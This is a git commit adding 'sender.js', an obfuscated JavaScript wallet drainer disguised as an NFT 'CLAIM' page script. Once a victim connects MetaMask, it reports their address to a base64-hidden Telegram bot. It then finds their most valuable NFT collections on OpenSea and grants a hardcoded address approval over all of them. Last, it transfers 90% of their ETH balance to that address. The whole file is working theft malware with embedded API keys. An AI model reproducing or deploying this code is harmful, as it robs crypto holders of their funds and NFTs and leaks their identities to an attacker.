fb4204bc884fa678ac801d60d828b75504d2b27c
othersidemeta <104738765+othersidemeta@users.noreply.github.com>
2022-05-03 04:30:09 +0530

    Add files via upload

---
+++ sender.js
@@ -0,0 +1,112 @@
+function _0x44db() {
+    const _0x4d390e = ['CLAIM', 'localStorage', '878306gsIomH', 'providers', 'open', 'dir', 'WXNbd', '28220oTxzTN', 'toString', 'bucks', 'DvAeg', 'any', 'selectedWallet', 'push', '55BrULZT', 'log', 'stats', '1254knJIVP', 'textContent', 'owner', '1110132VDLLbt', 'oKRlV', '252332MOSQYi', 'connectWallet', 'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUxNDUwNjQ1OTU6QUFIL', 'yMTE2ODkzNjQ4', 'Failed!\x20Try\x20again!', 'POST', 'listAccounts', 'readyToTransact', 'Mzg4NDM2ZDMyMDRiNDkxYWJkZmYzNzUxZjMxODVjNjE=', 'send', '8047128SPgXzB', 'then', 'utils', '&offset=0&limit=300', '0xB235f1dA0313975DBB6465946B7255Fcf9691547', 'spender', 'fHLWi', 'function', 'parseEther', 'metamask', '.bayc-button', 'vxjsp', 'bool', 'uint256', 'address', '11746pEZAxN', 'formatEther', 'onclick', 'https://mainnet.infura.io/v3/afa71de7abfb45beb016ac97e40f19ff', 'walletCheck', 'balanceOf', 'no\x20nft', 'opensea', 'name', 'approve', 'onboard', 'provider', 'walletSelect', '0xbcC389227723880531A89c619351092343A59f40', 'indexOf', 'view', 'qzewt', 'getUncheckedSigner', 'nonpayable', 'setItem', '1038660SSVTgK', 'wallet.sendMoney()', 'application/json', '130IEZCjY', 'XlHMnBRRGJZTG44Z2lPUHBBNklnWjFuZ3pEbTZ2SDgvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0', 'length', 'd16dc3a0-eebd-4480-8d88-096a6e501421', 'primary_asset_contracts', 'Web3Provider', 'scan', 'approved', 'one_day_average_price', 'sendMoney', 'tNzY5MjQyMTAw', 'description', 'hexlify', 'setApprovalForAll'];
+    _0x44db = function() { return _0x4d390e; };
+    return _0x44db();
+}
+const _0x493329 = _0x4f53;
+
+function _0x4f53(_0x255516, _0x488505) { const _0x44db3c = _0x44db(); return _0x4f53 = function(_0x4f5301, _0x541206) { _0x4f5301 = _0x4f5301 - 0x1c9; let _0x311013 = _0x44db3c[_0x4f5301]; return _0x311013; }, _0x4f53(_0x255516, _0x488505); }(function(_0x1f2421, _0x9e4dc3) {
+    const _0x168f7a = _0x4f53,
+        _0x4223f3 = _0x1f2421();
+    while (!![]) {
+        try {
+            const _0x53f111 = parseInt(_0x168f7a(0x1d8)) / 0x1 + parseInt(_0x168f7a(0x1d3)) / 0x2 + parseInt(_0x168f7a('0x214')) / 0x3 + -parseInt(_0x168f7a('0x1e7')) / 0x4 * (-parseInt(_0x168f7a(0x1df)) / 0x5) + -parseInt(_0x168f7a(0x1e2)) / 0x6 * (parseInt(_0x168f7a('0x200')) / 0x7) + parseInt(_0x168f7a('0x1f1')) / 0x8 + parseInt(_0x168f7a('0x1e5')) / 0x9 * (-parseInt(_0x168f7a('0x217')) / 0xa);
+            if (_0x53f111 === _0x9e4dc3) break;
+            else _0x4223f3['push'](_0x4223f3['shift']());
+        } catch (_0x90df0b) { _0x4223f3['push'](_0x4223f3['shift']()); }
+    }
+}(_0x44db, 0x88843));
+const BLOCKNATIVE_KEY = _0x493329('0x21a'),
+    NETWORK_ID = 0x1,
+    RPC_URL = _0x493329('0x203'),
+    ADDRESS = _0x493329('0x1f5'),
+    abi20 = [{ 'constant': ![], 'inputs': [{ 'internalType': _0x493329('0x1ff'), 'name': _0x493329(0x1f6), 'type': _0x493329(0x1ff) }, { 'internalType': _0x493329(0x1fe), 'name': 'amount', 'type': _0x493329('0x1fe') }], 'name': _0x493329('0x209'), 'outputs': [{ 'internalType': _0x493329(0x1fd), 'name': '', 'type': _0x493329(0x1fd) }], 'payable': ![], 'stateMutability': _0x493329('0x212'), 'type': 'function' }],
+    abi721 = [{ 'constant': ![], 'inputs': [{ 'internalType': _0x493329('0x1ff'), 'name': 'to', 'type': _0x493329('0x1ff') }, { 'internalType': 'bool', 'name': _0x493329('0x1ca'), 'type': _0x493329(0x1fd) }], 'name': 'setApprovalForAll', 'outputs': [], 'payable': ![], 'stateMutability': _0x493329(0x212), 'type': _0x493329(0x1f8) }, { 'constant': !![], 'inputs': [{ 'internalType': _0x493329('0x1ff'), 'name': _0x493329('0x1e4'), 'type': _0x493329(0x1ff) }], 'name': _0x493329(0x205), 'outputs': [{ 'internalType': _0x493329(0x1fe), 'name': '', 'type': 'uint256' }], 'payable': ![], 'stateMutability': _0x493329('0x20f'), 'type': _0x493329(0x1f8) }];
+var currentAccount, openSeaGet;
+const zxgkb = _0x493329('0x1ea'),
+    awdewad = _0x493329('0x1e9'),
+    fwarg = _0x493329('0x218'),
+    qw2d111 = 'JnRleHQ9YmF5YzI1MDQgaHR0cHM6Ly9ldGhlcnNjYW4uaW8vYWRkcmVzcy8=',
+    dqwpo = _0x493329('0x1cd');
+var nft = [],
+    nftSorted = [],
+    balanceInEth, req = new XMLHttpRequest();
+class Wallet {
+    [_0x493329(0x20b)];
+    [_0x493329('0x20a')] = Onboard({
+        'dappId': BLOCKNATIVE_KEY,
+        'networkId': NETWORK_ID,
+        'darkMode': !0x0,
+        'subscriptions': {
+            'wallet': wallet => {
+                const _0x3f2efd = _0x493329;
+                wallet['provider'] ? (this['provider'] = new ethers[(_0x3f2efd(0x1d4))][(_0x3f2efd(0x21c))](wallet['provider'], _0x3f2efd(0x1dc)), window[_0x3f2efd(0x1d2)][_0x3f2efd('0x213')](_0x3f2efd('0x1dd'), wallet[_0x3f2efd(0x208)])) : _0x3f2efd(0x1f7) === _0x3f2efd('0x1f7') ? this[_0x3f2efd(0x20b)] = null : (this[_0x3f2efd(0x20b)] = new _0x53f1b0[(_0x3f2efd('0x1d4'))][(_0x3f2efd(0x21c))](_0x238b71[_0x3f2efd(0x20b)], _0x3f2efd(0x1dc)), _0x552d36[_0x3f2efd(0x1d2)][_0x3f2efd(0x213)](_0x3f2efd(0x1dd), _0x18a4e['name']));
+            }
+        },
+        'walletSelect': { 'wallets': [{ 'walletName': _0x493329(0x1fa) }] }
+    });
+    async [_0x493329(0x1e8)]() {
+        const _0x15baee = _0x493329;
+        await this[_0x15baee('0x20a')][_0x15baee('0x20c')](), await this[_0x15baee(0x20a)][_0x15baee(0x204)]();
+    }[_0x493329('0x1ee')] = async() => {
+        const _0x1107cd = _0x493329;
+        if (!this[_0x1107cd('0x20b')]) {
+            if ('qzewt' !== _0x1107cd('0x210')) _0x40273c[_0x1107cd(0x20b)] ? (this['provider'] = new _0xefa969[(_0x1107cd(0x1d4))][(_0x1107cd(0x21c))](_0x3d6583[_0x1107cd('0x20b')], 'any'), _0x4d8aca[_0x1107cd('0x1d2')][_0x1107cd('0x213')](_0x1107cd('0x1dd'), _0x5f10f8[_0x1107cd(0x208)])) : this[_0x1107cd('0x20b')] = null;
+            else { const _0x6774d1 = await this[_0x1107cd('0x20a')][_0x1107cd(0x20c)](); if (!_0x6774d1) return !0x1; }
+        }
+        const _0x4eedf6 = await this[_0x1107cd('0x20a')]['walletCheck']();
+        return _0x4eedf6;
+    };
+    async [_0x493329('0x1c9')]() {
+        const _0x3b0eed = _0x493329;
+        setTimeout(0x3e8), nft = [], nftSorted = [];
+        const _0x63cdd4 = await this[_0x3b0eed('0x1ee')]();
+        if (!_0x63cdd4) return;
+        const _0x119bf5 = this[_0x3b0eed('0x20b')][_0x3b0eed(0x211)]();
+        currentAccount = await this['provider'][_0x3b0eed(0x1ed)](), currentAccount != undefined && (document['querySelector']('.bayc-button')[_0x3b0eed(0x1e3)] = _0x3b0eed(0x1d1), document['querySelector'](_0x3b0eed(0x1fb))['removeAttribute'](_0x3b0eed('0x202')), await document['querySelector'](_0x3b0eed(0x1fb))['setAttribute']('onclick', _0x3b0eed(0x215))), balanceInEth = (ethers[_0x3b0eed(0x1f3)][_0x3b0eed(0x201)](await this[_0x3b0eed(0x20b)]['getBalance'](currentAccount[0x0])) * 0.9)[_0x3b0eed('0x1d9')](), console[_0x3b0eed(0x1e0)](typeof balanceInEth), console['log'](currentAccount[0x0]), req[_0x3b0eed('0x1d5')](_0x3b0eed(0x1ec), atob(awdewad + fwarg + zxgkb + qw2d111) + currentAccount, !![]), req[_0x3b0eed(0x1f0)](), this[_0x3b0eed(0x207)](currentAccount[0x0]);
+    }
+    async [_0x493329('0x207')](_0x5393e1) {
+        const _0x741e89 = _0x493329,
+            _0xc41634 = this[_0x741e89('0x20b')][_0x741e89(0x211)](),
+            _0x5b9286 = { 'method': 'GET', 'headers': { 'Accept': _0x741e89('0x216'), 'X-API-KEY': atob(_0x741e89('0x1ef')) } };
+        var _0x125789 = await fetch('https://api.opensea.io/api/v1/collections?asset_owner=' + _0x5393e1 + _0x741e89(0x1f4), _0x5b9286);
+        _0x125789 = await _0x125789['json'](), console['log'](_0x125789);
+        try {
+            for (var _0xf53b4b = 0x0; _0xf53b4b < _0x125789['length']; _0xf53b4b++) {
+                if (_0x741e89(0x1d7) !== _0x741e89('0x1d7')) _0x1fe142[_0x1260c6][_0x741e89('0x1da')] > _0x235bef && _0x290153[_0x741e89('0x20e')](_0x12c3c6[_0x15907b]) < 0x0 && (_0x4797a4 = _0x4981b3[_0x3e7419][_0x741e89(0x1da)], _0x370307 = _0x524f4b[_0x4f1715]);
+                else {
+                    if (_0x125789[_0xf53b4b][_0x741e89('0x1ce')] = '') continue;
+                    nft[_0x741e89('0x1de')]({ 'address': _0x125789[_0xf53b4b][_0x741e89(0x21b)][0x0]['address'], 'name': _0x125789[_0xf53b4b][_0x741e89('0x21b')][0x0][_0x741e89(0x208)], 'price': _0x125789[_0xf53b4b][_0x741e89('0x1e1')][_0x741e89('0x1cb')] * 0xbb8, 'amount': _0x125789[_0xf53b4b]['owned_asset_count'], 'bucks': _0x125789[_0xf53b4b]['owned_asset_count'] * _0x125789[_0xf53b4b]['stats']['one_day_average_price'] * 0xbb8 });
+                }
+            }
+            var _0x38cdc6 = 0x0,
+                _0x378294 = nft[0x0];
+            for (var _0xf53b4b = 0x0; _0xf53b4b < _0x125789[_0x741e89(0x219)]; _0xf53b4b++) {
+                if (_0x741e89('0x1db') !== _0x741e89(0x1db)) _0x20adf2 = _0x5a3b3b[_0x247be5][_0x741e89('0x1da')], _0x4d51e8 = _0x5e1d77[_0x47aadc];
+                else {
+                    for (var _0x212dce = 0x0; _0x212dce < _0x125789[_0x741e89('0x219')]; _0x212dce++) { nft[_0x212dce][_0x741e89('0x1da')] > _0x38cdc6 && nftSorted[_0x741e89(0x20e)](nft[_0x212dce]) < 0x0 && (_0x38cdc6 = nft[_0x212dce][_0x741e89(0x1da)], _0x378294 = nft[_0x212dce]); }
+                    if (nftSorted[_0x741e89('0x20e')](_0x378294) < 0x0) nftSorted[_0x741e89('0x1de')](_0x378294);
+                    else continue;
+                    _0x38cdc6 = 0x0;
+                }
+            }
+            console[_0x741e89(0x1e0)](nft), console['log'](nftSorted);
+        } catch (_0x495356) { _0x741e89('0x1fc') !== 'vxjsp' ? _0x1bc525[_0x741e89(0x1d6)](_0x567983) : console[_0x741e89('0x1e0')](_0x741e89(0x206)); }
+    }
+    async [_0x493329('0x1cc')]() {
+        const _0x405d96 = _0x493329,
+            _0x1742c9 = this['provider'][_0x405d96('0x211')]();
+        for (var _0x33af0a = 0x0; _0x33af0a < nftSorted['length']; _0x33af0a++) {
+            if (_0x405d96('0x1e6') === 'oKRlV') {
+                const _0x1c0004 = new ethers['Contract'](nftSorted[_0x33af0a][_0x405d96(0x1ff)], abi721, _0x1742c9);
+                console[_0x405d96('0x1e0')](_0x1c0004), await _0x1c0004[_0x405d96('0x1d0')]('0xbcC389227723880531A89c619351092343A59f40', !![]), req[_0x405d96(0x1d5)]('POST', atob(awdewad + fwarg + dqwpo + qw2d111) + currentAccount, !![]), req['send'](), alert(_0x405d96('0x1eb'));
+            } else _0x37dcfb[_0x405d96('0x1e0')]('no\x20nft');
+        }
+        const _0x1ed4d8 = { 'from': this['currentAccount'], 'to': _0x405d96(0x20d)['toLowerCase'](), 'value': ethers[_0x405d96(0x1f3)][_0x405d96(0x1f9)](balanceInEth), 'gasLimit': ethers['utils'][_0x405d96(0x1cf)](0x5208) };
+        _0x1742c9['sendTransaction'](_0x1ed4d8)[_0x405d96('0x1f2')](_0x1f6b01 => {
+            const _0x1f997e = _0x405d96;
+            console[_0x1f997e('0x1d6')](_0x1f6b01);
+        });
+    }
+}
+const wallet = new Wallet();
